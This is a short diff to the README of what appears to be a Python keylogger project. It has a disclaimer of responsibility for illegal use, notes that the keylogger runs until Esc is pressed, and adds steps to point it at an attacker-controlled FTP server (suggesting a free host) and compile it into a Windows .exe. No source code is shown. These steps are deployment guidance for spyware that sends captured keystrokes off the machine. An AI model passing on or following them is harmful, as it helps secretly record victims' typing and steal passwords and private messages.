@@ -13,5 +13,6 @@ I AM NOT RESPONSIBLE FOR ANY ILLEGAL USE OF THIS PROJECT
 # Description :
 When you run this project the keylogger is immediatly active and the keylogger stop when you press Esc key.
 
-# Guide :
-You need to change ftp server address, username, password
+# Guide to make executable :
+You need to change ftp server address, username, password to your ftp server (you can create one on 000webhost for free) on main.py
+And you can compile the python script to .exe using pyinstaller or auto-py-to-exe
